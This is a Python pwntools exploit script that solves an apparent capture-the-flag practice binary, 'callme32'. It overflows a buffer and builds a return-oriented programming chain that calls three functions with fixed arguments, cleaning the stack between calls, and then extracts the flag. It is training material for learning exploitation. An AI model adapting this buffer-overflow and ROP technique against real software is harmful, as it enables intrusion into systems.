from pwn import *
import time

context.arch = "i386"
context.log_level = "critical"

bin = "./callme32"
elf = ELF(bin)
p = process(bin)
#p = gdb.debug(bin, "b callme_two\nc")

p.recvuntil("> ")

#rop = ROP(bin)
#rop.raw(b"i"*44)
#rop.call(elf.symbols["callme_one"], [ 0xdeadbeef, 0xcafebabe, 0xd00df00d ])
#rop.call(elf.symbols["callme_two"], [ 0xdeadbeef, 0xcafebabe, 0xd00df00d ])
#rop.call(elf.symbols["callme_three"], [ 0xdeadbeef, 0xcafebabe, 0xd00df00d ])
#p.sendline(rop.chain())
#print(re.search(b"ROPE{(.+?)}", p.recvall()).group(0))

payload = [
    b"i"*44,
    p32(elf.symbols["callme_one"]),
    p32(0x80484aa), # _init +9
    p32(0xdeadbeef),
    p32(0xcafebabe),
    p32(0xd00df00d),
    p32(elf.symbols["callme_two"]),
    p32(0x80484aa), # _init +9
    p32(0xdeadbeef),
    p32(0xcafebabe),
    p32(0xd00df00d),
    p32(elf.symbols["callme_three"]),
    p32(0x80484aa), # _init +9
    p32(0xdeadbeef),
    p32(0xcafebabe),
    p32(0xd00df00d),
]
p.sendline(b"".join(payload))

print(re.search(b"ROPE{(.+?)}", p.recvall()).group(0))
